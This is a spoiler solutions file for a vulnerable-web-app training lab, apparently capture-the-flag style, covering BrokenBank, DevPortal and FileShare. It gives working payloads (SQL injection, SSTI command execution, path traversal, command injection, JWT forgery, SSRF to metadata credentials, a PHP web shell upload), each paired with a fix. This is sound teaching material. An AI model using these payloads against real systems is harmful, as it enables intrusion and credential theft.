# Solutions (SPOILERS)

Each entry gives one working path. Most challenges have more than one.

## BrokenBank
1. **Login bypass**: username `admin'--`, any password. The admin dashboard shows the flag.
   Fix: parameterised query.
2. **The vault**: `/search?q=zzz' UNION SELECT name,value FROM secrets--`. To find the table first,
   use `UNION SELECT name,sql FROM sqlite_master--`. Fix: parameterised query and generic errors.
3. **Nosy neighbour**: log in as `bob/password` and browse `/account/1`. Fix: check `uid == session['uid']`.
4. **Infinite money**: as bob, transfer `amount=-200000` to alice. A negative amount passes the
   `amount > balance` check and adds money to you. Fix: reject `amount <= 0` and wrap the debit and credit in a transaction.
5. **Templates gone wild**: `/greet?name={{ cycler.__init__.__globals__.os.popen('cat /home/bank/flag_ssti.txt').read() }}`.
   Fix: pass `name` as a template variable instead of concatenating it into the template.
   Bonus: `flask-unsign --sign --cookie "{'uid':1,'username':'admin','role':'admin'}" --secret dev` also reaches flag 1.

## DevPortal
1. **Outside the docs**: either path traversal with `/docs?file=../../../opt/flag.txt` (the
   `replace` only strips the first `../`), or command injection with `/tools/ping?host=127.0.0.1 | cat /opt/flag.txt`
   (`;` and `&` are blocked, but `|`, `$( )`, backticks and `%0a` are not).
   Fix: `path.resolve` plus a check that the result starts with DOCS; use `execFile('ping', ['-c','1',host])` with an IP regex.
2. **Promote yourself**: either forge an `alg: none` token like `base64url({"alg":"none"}).base64url({"user":"x","role":"admin"}).`,
   or crack the HS256 secret (`hashcat -m 16500 jwt.txt rockyou.txt` gives `secret123`) and re-sign it.
   Fix: `jwt.verify(t, strongSecret, { algorithms: ['HS256'] })` only.
3. **Metadata heist**: the HTML comment points to `/debug/env`, which leaks `METADATA_URL`. Then request
   `/tools/preview?url=http://metadata:8080/latest/meta-data/iam/security-credentials/devportal-role`.
   The `SecretAccessKey` is the flag. Fix: an allowlist of schemes and hosts, and resolve the hostname then block private ranges.

## FileShare
1. **Read the config**: `/?page=php://filter/convert.base64-encode/resource=config`, then base64-decode the output.
   Fix: map `page` to an allowlist such as `['home','upload','gallery']`.
2. **Shell upload**: upload `shell.phtml` containing `<?php system($_GET['c']);` and set
   `Content-Type: image/png` in Burp. Then visit `/uploads/shell.phtml?c=cat+/flag_rce.txt`.
   Fix: check the real file type (`finfo`), use an extension allowlist, rename uploads to random names,
   and disable script execution in `/uploads`.
